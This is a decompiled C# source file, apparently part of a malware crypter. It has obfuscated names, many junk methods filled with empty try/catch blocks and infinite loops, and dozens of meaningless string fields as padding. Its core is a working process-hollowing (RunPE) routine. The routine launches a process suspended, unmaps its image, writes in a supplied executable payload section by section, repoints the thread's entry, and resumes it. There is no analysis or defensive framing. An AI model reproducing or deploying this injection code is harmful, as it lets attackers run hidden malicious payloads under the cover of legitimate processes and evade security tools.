using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ajhfsdlhjasnagfgewfwsg;

internal class sadisaduoiasudoiwqueoixzucoixzuocisad
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	internal class H
	{
		public struct Context
		{
			public uint Flags;

			public uint D0;

			public uint D1;

			public uint D2;

			public uint D3;

			public uint D6;

			public uint D7;

			public Save Save;

			public uint SG;

			public uint SF;

			public uint SE;

			public uint SD;

			public uint Edi;

			public uint Esi;

			public uint Ebx;

			public uint Edx;

			public uint Ecx;

			public uint Eax;

			public uint Ebp;

			public uint Eip;

			public uint SC;

			public uint EFlags;

			public uint Esp;

			public uint SS;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
			public byte[] Registers;
		}

		public struct Save
		{
			public uint Control;

			public uint Status;

			public uint Tag;

			public uint ErrorO;

			public uint ErrorS;

			public uint DataO;

			public uint DataS;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
			public byte[] RegisterArea;

			public uint State;
		}

		public struct Misc
		{
			public uint Address;

			public uint Size;
		}

		public struct Section_Header
		{
			public byte Name;

			public Misc Misc;

			public uint Address;

			public uint Size;

			public uint Pointer;

			public uint PRelocations;

			public uint PLines;

			public uint NRelocations;

			public uint NLines;

			public uint Flags;
		}

		public struct Process_Information
		{
			public IntPtr Process;

			public IntPtr Thread;

			public int ProcessId;

			public int ThreadId;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct Startup_Information
		{
			public int CB;

			public string ReservedA;

			public string Desktop;

			public string Title;

			public int X;

			public int Y;

			public int XSize;

			public int YSize;

			public int XCount;

			public int YCount;

			public int Fill;

			public int Flags;

			public short ShowWindow;

			public short ReservedB;

			public int ReservedC;

			public int Input;

			public int Output;

			public int Error;
		}

		public struct Security_Flags
		{
			public int Length;

			public IntPtr Descriptor;

			public int Inherit;
		}

		public struct DOS_Header
		{
			public ushort Magic;

			public ushort Last;

			public ushort Pages;

			public ushort Relocations;

			public ushort Size;

			public ushort Minimum;

			public ushort Maximum;

			public ushort SS;

			public ushort SP;

			public ushort Checksum;

			public ushort IP;

			public ushort CS;

			public ushort Table;

			public ushort Overlay;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
			public ushort[] ReservedA;

			public ushort ID;

			public ushort Info;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
			public ushort[] ReservedB;

			public int Address;
		}

		public struct NT_Headers
		{
			public uint Signature;

			public File_Header File;

			public Optional_Headers Optional;
		}

		public struct File_Header
		{
			public ushort Machine;

			public ushort Sections;

			public uint Stamp;

			public uint Table;

			public uint Symbols;

			public ushort Size;

			public ushort Flags;
		}

		public struct Optional_Headers
		{
			public ushort Magic;

			public byte Major;

			public byte Minor;

			public uint SCode;

			public uint IData;

			public uint UData;

			public uint Address;

			public uint Code;

			public uint Data;

			public uint Image;

			public uint SectionA;

			public uint FileA;

			public ushort MajorO;

			public ushort MinorO;

			public ushort MajorI;

			public ushort MinorI;

			public ushort MajorS;

			public ushort MinorS;

			public uint Version;

			public uint SImage;

			public uint SHeaders;

			public uint Checksum;

			public ushort Subsystem;

			public ushort Flags;

			public uint SSReserve;

			public uint SSCommit;

			public uint SHReserve;

			public uint SHCommit;

			public uint LFlags;

			public uint Count;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
			public Data_Directory[] DataDirectory;
		}

		public struct Data_Directory
		{
			public uint Address;

			public uint Size;
		}

		[DebuggerNonUserCode]
		public H()
		{
		}

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CreateProcess([MarshalAs(UnmanagedType.VBByRefStr)] ref string name, [MarshalAs(UnmanagedType.VBByRefStr)] ref string command, ref Security_Flags process, ref Security_Flags thread, bool inherit, uint flags, IntPtr system, [MarshalAs(UnmanagedType.VBByRefStr)] ref string current, [In] ref Startup_Information startup, out Process_Information info);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool WriteProcessMemory(IntPtr process, IntPtr address, byte[] buffer, IntPtr size, out int written);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int ReadProcessMemory(IntPtr process, IntPtr address, ref IntPtr buffer, IntPtr size, ref int read);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int VirtualProtectEx(IntPtr process, IntPtr address, UIntPtr size, UIntPtr @new, [Out] uint old);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr VirtualAllocEx(IntPtr process, IntPtr address, uint size, uint type, uint protect);

		[DllImport("ntdll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern long ZwUnmapViewOfSection(IntPtr process, IntPtr address);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern uint ResumeThread(IntPtr thread);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool GetThreadContext(IntPtr thread, ref Context context);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool SetThreadContext(IntPtr thread, ref Context context);
	}

	private string HMGRHOOWTYJMKSGVYLXSJXYXWQTUIT;

	private string GMLYNVKNGDROIKNXTAWXVQJZNTMILN;

	private string STJLEYRSWSSLZQNPZFVNLQZKINBMVD;

	private string QSNRJFNKIXAOXJVRVUUSYJKMZPUAXX;

	private string PSSYPLJCVCHQVBDTQKSXKCVORSMOAR;

	private string BZQLGPQHLQINLHDLWPSNACKZLMBSKH;

	private string AZUSMVMYYVQQJZKNRERSNVVBDOUGNB;

	private string MGSEDZUDNKRNZFKFYJQIDVKMYIJKXR;

	private string KFWLIFPVAPZPYYSHTYPNQOVOPLBYAL;

	private string JFBSOMLNNUHSWQAJONNSCHGQHNUMCF;

	private string VMZEFPTSCJIOMWABUSNISHWBBHJQMV;

	private string TMDLLWOJPOQRKOHDQHMNFAHDTKBEPP;

	private string SLISQCKBCTYUIHPFLXKSRTSFLMUSSJ;

	private string ESFFHGSGRHZQZNPXRCKIHTHRFGJWCZ;

	private string DSKLNMNYEMHTXFXZNRINUMSTXJBKFT;

	private string PZIYEQVDUBIQNLXRTWICKMHERCQOPI;

	private string NZMFKWRUHGQSLDETOLHIWFSGJFJCSD;

	private string MYRMPDMMTLYVJWMVJAFNJZDIBIBQUX;

	private string YFOYGGURJAZSACMNQFFDZYTTVBQUEN;

	private string XFTFMNQJWFHUYUUPLUDIMSDVNEJIHH;

	private string VEYMRUMAIKPXWNBQGKCNYLOXEHBWKB;

	private string HMVYJXTFYYQUMSBJMPCDOLEIZAQAUR;

	private string GLAFOEPXLDYWKLJLIEAIBEPKRDJOXL;

	private string SSXSFHWCASZTARJDOJAXREEVLXYSHA;

	private string RSCZLOSUNXHWZJRFJYYDDXPXDZQGJV;

	private string PRHGQUOLACOYXCYGFNXIQQAZUCJUMP;

	private string BZESIYVQQRPVNIYZLSXXGQPLPWYYWE;

	private string AYJZNERICWXYLAGAGHVDSJANGZQMZZ;

	private string YYOGTLNAPBFAKSOCBXUIFCLPYBJACT;

	private string KFLSKOUFFQGXAYOUICTYVCBASVYEMJ;

	private string JEQZQVQWRVOZYRVWDRSDHVMCKYRSOD;

	private string VMNMHYXBHJPWOXVOJWSSXVBNERFWYS;

	private string PWSZKCWCSFFRTVRRWULDYBEFNXKTDSVTXDLMIXPZMHVINK;

	private string NWXGQJRUFKNTRNZTSJJJLUPHFADHGNCMSWNEPEGWEOFRZK;

	private string ADUSHMZYVZOQHTYLYPJYBUESZTSLQCSLYQYYSDCIQCDCZG;

	private string YDZZNTVQHEWTFLGNTEIDNNPURWKZTWYDUJZRAKTFHKMLLG;

	private string KKWMEWCVXSXPVRGFZJHTDNFFLQZDDMODADKLDJPRTYLXLD;

	private string JJBTJDYNKXFSUKOHVYGYQGQHDTSRGGUVWWLEKRHOLGUGXC;

	private string HJGAPKUFWCMUSCWJQNEDCZBJVVLFIBAORPNXSYYMCNEOJC;

	private string TQDMGNBJMRNRIIVBWSETSZQVPPZJSQQNXJYRVXUYOCCAJZ;

	private string SQITMUXBZWVUGBDDRHDYFSBXHSSXVKWGTCZKDFLVFJLJVZ;

	private string JZXVDZBUKWSWEKVEYSYOYHWDCJYHUZYJLQFMXHPWMNDHED;

	private string DWKMJEAYBQETVZLXTCBTHLBKTOAPIUSXVOLWNLYEJFTDIV;

	private string BWPTOKWQOVMWTRTZORZYUEMMLRSDLOZQQHNPVSPBAMDMUV;

	private string NDMGFODUEJNTJXSRUWZOKECXFKHHVEOPWBYJYSLNMBBXUR;

	private string MDRNLUZMQOVVHQATQLYTXXMZXNAVXYVISUZCFZCKEIKGGR;

	private string LCWTQBVEDTDYFIIULAWYJRXBPQSJASBAONBVNGUHVQUPSR;

	private string XJTGIECJTIEVVOINRFWOZQNMJJHNKIRAUHMPQFQTHESASN;

	private string VJYNNLYBFNMXUGQONUUTMJYOBMABNCXSPANHXNHQZLCJEN;

	private string UIDUTRUSSSUASZXQIJTYYDJQSPSPQXDLLTPAFUYNQTLSQN;

	private string GQAGKVBXIHVWIFXIOPTOOCYBNIHTAMTKRNZUITUZCHKDQK;

	private string EPFNPBXPUMDZGXFKJERTBWJDELAHCGZCNGBNQBLWTPTMCJ;

	private string RWCZHFFUKAEWWDFDQJRJRVYPZFPLMWPCTZMHTAHIFDRYCG;

	private string PWHGMLALXFMYVVNELYPODPJRQHHZPQVUOTNAAHYGXLBGOG;

	private string OVMNSSWDJKUBTOUGGNOTQIUTIKANSKCNKMPTIOQDOSKPBF;

	private string ADJAJVEIZZVYJUUYMSOJGIKECEPRCASMQFZNLNMPAHJBBC;

	private string YCOHOCZAMEDAHMCAIHMOSBVGUGHFFUYFMYBFSVDMSOSKNC;

	private string XCTNUJVSYJKDFFKCDWLTFUGIMJATIPEXHRCYACUJJVCSZB;

	private string JJQALMDWOYMAWKKUJCKJVUVTGDPXSEUWNLNSDBQVVKAEZY;

	private string IIVHRTZOBDTCUDRWFRJOINGVYFHLUYAPJEPLLJHSNRJNLY;

	private string UQSTIWGTRRUZKJROLWJDYNVGSZWPEOQOPYZFOIDEYGIYLU;

	private string SPXANCCLDXCCIBZQGLHJKGGIKCPDHIWHLRBYVPUBQNRHXU;

	private string RPCHTJYDQCKEGUHSBAGOXZRKCFHRKCDZGKCRDWMYHVBQJU;

	private string DWZUKMFHGQLBWAHKIFFENZHVWYWVUSSZMENLGWIKTJZBJR;

	private string CVEAQTBZSVTEVSOMDUEJZSRXOBPJXMZRIXPDNDZHLQIKVQ;

	private string AVJHVAXRFABGTKWOYJDOMMCZGEIXZGFKEQQWVKQECYSTIQ;

	private string MCGUMDEWVPCDJQWGEPCECLSLAXWBJWVJKJBQYJMQOMQEHN;

	private string LCLBSKAOHUKGHJEIAEBJOFDNSAPPMQBBFCCJGRDOGUANUM;

	private string XJINJNHSXJLCXPEAGJAYEESYMTEUWFRBLWNDJQZZRIYZTJ;

	private string VINUPUDKKOTFWHLCBYZERXDAEWXHZAXTHPPWQXQXJQIHGJ;

	private string UISBUAZCWTBHUZTEXNYJEROCVZPVCUDMDIQPYFIUBXRQSI;

	private string GPPNLEGHMHCEKFTWDSXYUQDNQSEAMKTLJCBIBEEGMMPCSF;

	private string FPUURKCYZMKHIYBYYHWEGKOPHVXOOEZEEVDBILVDETZLEF;

	private string DOZBWRYQMRSJGQIATWVJTDZRZYPBRYGWAOEUQSMAVAITQF;

	private string PVWOOUFVBGTGXWISACUZJDPCTSEGBOWVGIPOTRIMHPHFQB;

	private string OVBUTBBNOLBJVOQUVRTEVWAELUXUEICOCBQHAZZJZWQOCB;

	private string ACYHKEJSEACGLUQMBWSTLWPPGOMYOXSNIVBBEYVVKLOZCY;

	private string ZCDOQLEJQFKIJNYOWLRZYPARXREMRSYGDODULFMSCSYIOX;

	private string XBIVWRABDKRLHFFQSAQEKILTPTXAUMEYZHEMTNEPUAHRAX;

	private string JIFHNVIGTYTIYLFIYFPTAIAFJNMEECUYFAPGWMABFOGCAU;

	private string IIKOSBDYFDAKWENKTUOZNBLHBQESGWAQBTQZDTRYXVPLNT;

	private string GIPVYIZQSIINUWVMPJNEZUWJTSXGJQGJWMSSLAIVPDZUZT;

	private string TPMHPLHUIXJJKCVEVPMTPUMUNMMKTGWICGDMOAEHARXFZQ;

	private string ROROVSCMVCRMIUCGQELZCNWWFPEYWADAYZEFVHVFSZGOLP;

	private string DVOBMVKRKRSJYACYWJKOSNMHZITCGPSAETPZYGRQDNFALM;

	private string CVTIRCGJXWALXTKASYJUFGXJRLMQJKZSAMQSGNIOVVOIXM;

	private string AVYPXJBBKBIOVLSCNNIZRAILJOEELEFLVFSKOVALNCYRJM;

	private string NCVBOMJFZPJLLRSUTSHOHZXWDHTIVTVKBZDERUWXYRWDJI;

	private string LBAIUTFXMURNJJZWOHGUUTIYVKMWYOBDXSEXYBNUQYFLVI;

	private string KBFPZZAPZAZQHCHYKWEZGMTAMNFKBIHVTLGQGJERIFPUHI;

	private string WICBQDIUOOANYIHQQCEOWLILHGTOLYXUZFQKJIADTUNGHE;

	private string UIHIWJEMBTIPWAPSLRDUJFTNZJMCOSDNUYSDQPRALBXPTE;

	private string GPEVNNLQRIJMMGPKSWCJZEJZTDBGYHTMARDXTONMWQVATB;

	private string FOJBTTHIENRPKYWMNLBOLYUBLFUUACZFWKEQBVEJOXFJGA;

	private string EOOIYADAQSZRIREOIAZUYRFDCIMIDWGXSDGIJDWGGFOSSA;

	private string QVLVPDKFGHAOZXEGOFZJORUOXCBMNLWXYXQCMCRSRTMDSX;

	private string OVQCVKGWTMIRXPMIKUYPAKFQOEUAQGCPTQSVTJJPJAWMEX;

	[DebuggerNonUserCode]
	public sadisaduoiasudoiwqueoixzucoixzuocisad()
	{
	}

	public static void Execute(byte[] data)
	{
		Execute(data, Assembly.GetEntryAssembly()!.Location);
	}

	public static void Execute(byte[] data, string target)
	{
		H.Context context = default(H.Context);
		H.Process_Information info = default(H.Process_Information);
		H.Startup_Information startup = default(H.Startup_Information);
		H.Security_Flags process = default(H.Security_Flags);
		H.Security_Flags thread = default(H.Security_Flags);
		GCHandle gCHandle = GCHandle.Alloc(data, GCHandleType.Pinned);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), default(H.DOS_Header).GetType());
		H.DOS_Header dOS_Header = default(H.DOS_Header);
		H.DOS_Header dOS_Header2 = ((obj != null) ? ((H.DOS_Header)obj) : dOS_Header);
		gCHandle.Free();
		string name = null;
		string current = null;
		IntPtr system = default(IntPtr);
		if (0 - (H.CreateProcess(ref name, ref target, ref process, ref thread, inherit: false, 4u, system, ref current, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		H.NT_Headers nT_Headers = default(H.NT_Headers);
		IntPtr ptr = new IntPtr(checked(num + dOS_Header2.Address));
		object? obj2 = Marshal.PtrToStructure(ptr, nT_Headers.GetType());
		H.NT_Headers nT_Headers2 = default(H.NT_Headers);
		nT_Headers = ((obj2 != null) ? ((H.NT_Headers)obj2) : nT_Headers2);
		startup.CB = Marshal.SizeOf((object)startup);
		context.Flags = 65538u;
		if (((long)nT_Headers.Signature != 17744L) | (dOS_Header2.Magic != 23117))
		{
			return;
		}
		bool threadContext = H.GetThreadContext(info.Thread, ref context);
		IntPtr process2 = info.Process;
		checked
		{
			IntPtr address = (IntPtr)(unchecked((long)context.Ebx) + 8L);
			IntPtr size = (IntPtr)4;
			int read = 0;
			IntPtr buffer = default(IntPtr);
			if (!(threadContext & (H.ReadProcessMemory(process2, address, ref buffer, size, ref read) >= 0) & (H.ZwUnmapViewOfSection(info.Process, buffer) >= 0L)))
			{
				return;
			}
			uint num2 = (uint)(int)H.VirtualAllocEx(info.Process, (IntPtr)nT_Headers.Optional.Image, nT_Headers.Optional.SImage, 12288u, 4u);
			if (unchecked((long)num2) == 0L)
			{
				return;
			}
			IntPtr process3 = info.Process;
			IntPtr address2 = (IntPtr)num2;
			IntPtr size2 = (IntPtr)nT_Headers.Optional.SHeaders;
			uint num3 = default(uint);
			read = (int)num3;
			H.WriteProcessMemory(process3, address2, data, size2, out read);
			num3 = (uint)read;
			long num4 = dOS_Header2.Address + 248;
			int num5 = unchecked((int)nT_Headers.File.Sections) - 1;
			H.Section_Header section_Header = default(H.Section_Header);
			H.Section_Header section_Header2 = default(H.Section_Header);
			for (int i = 0; i <= num5; i++)
			{
				ptr = new IntPtr(num + num4 + i * 40);
				object? obj3 = Marshal.PtrToStructure(ptr, section_Header.GetType());
				section_Header = ((obj3 != null) ? ((H.Section_Header)obj3) : section_Header2);
				byte[] array = new byte[(int)section_Header.Size + 1];
				int num6 = (int)(unchecked((long)section_Header.Size) - 1L);
				for (int j = 0; j <= num6; j++)
				{
					array[j] = data[(int)(unchecked((long)section_Header.Pointer) + unchecked((long)j))];
				}
				IntPtr process4 = info.Process;
				IntPtr address3 = (IntPtr)(num2 + section_Header.Address);
				IntPtr size3 = (IntPtr)section_Header.Size;
				read = (int)num3;
				H.WriteProcessMemory(process4, address3, array, size3, out read);
				num3 = (uint)read;
				H.VirtualProtectEx(info.Process, (IntPtr)(num2 + section_Header.Address), (UIntPtr)section_Header.Misc.Size, (UIntPtr)(ulong)Protect(section_Header.Flags), (uint)(int)buffer);
			}
			byte[] bytes = BitConverter.GetBytes(num2);
			IntPtr process5 = info.Process;
			IntPtr address4 = (IntPtr)(unchecked((long)context.Ebx) + 8L);
			IntPtr size4 = (IntPtr)4;
			read = (int)num3;
			H.WriteProcessMemory(process5, address4, bytes, size4, out read);
			num3 = (uint)read;
			context.Eax = num2 + nT_Headers.Optional.Address;
			H.SetThreadContext(info.Thread, ref context);
			H.ResumeThread(info.Thread);
		}
	}

	private static long Protect(long flags)
	{
		checked
		{
			if (flags < 0L)
			{
				flags += 4294967296L;
			}
			return (new long[8] { 1L, 16L, 2L, 32L, 4L, 64L, 4L, 64L })[(int)Math.Round((double)flags / 841.0)];
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_FuQDHuMY2025034873()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		double num = 0.2710239;
		do
		{
			try
			{
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			num += 1.0;
		}
		while (num <= 0.4629713);
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_lmwQbUgmOoeI2002682959()
	{
		new decimal(1737279796L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_gpwuQobJL341053670()
	{
		new decimal(-1179701265L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		double num = 0.7916495;
		do
		{
			try
			{
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			num += 1.0;
		}
		while (num <= 0.8058189);
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			new decimal(-142051368L);
			ProjectData.ClearProjectError();
		}
		double num2 = 0.2101725;
		do
		{
			num2 += 1.0;
		}
		while (num2 <= 0.2262142);
		try
		{
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_YgPWEqqfBWlFrUpB16952860()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			try
			{
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_geuXkWHFMaMChUIt864161822()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			new decimal(-1975800260L);
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_nECAJKceBhUUNawb1480997800()
	{
		new decimal(-1100950537L);
		while (true)
		{
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_dpaMDuVkjPnwS530910597()
	{
		new decimal(1165847882L);
		while (true)
		{
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_ERBqFbRB105420778()
	{
		for (double num = 0.3396568; !(num > 0.2412645); num += 1.0)
		{
			new decimal(2047893706L);
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		for (double num2 = 0.849157; num2 <= 0.2866166; num2 += 1.0)
		{
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_GRTXFOXDbbgxjbWoJU1859221943()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		double num = 0.005078852;
		do
		{
			try
			{
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				new decimal(-1941673792L);
				ProjectData.ClearProjectError();
			}
			try
			{
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			num += 1.0;
		}
		while (num <= 0.6185946);
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_nmrQWLk2018461527()
	{
		new decimal(-1145029142L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(-71356111L);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			new decimal(315803034L);
			new decimal(-2072884605L);
			new decimal(281045068L);
			ProjectData.ClearProjectError();
		}
		new decimal(-554242171L);
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_qnTBP1344562940()
	{
		new decimal(-1950490869L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_YDRyFFHWgsSUjghdyN275736892()
	{
		new decimal(-1024888960L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(1497105109L);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_QsKIdRqHskVT85619494()
	{
		new decimal(-851818800L);
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_omKFvdbkavhuVbIfK892757530()
	{
		new decimal(-1771223993L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(129126857L);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			new decimal(461004610L);
		}
	}

	public void rufysdnlfthpadkfktjspdiogusdpfjkpaosjkfpejmjdfkfjp_pSnegMwGMfVvnPCpFkl1971118203()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}
}
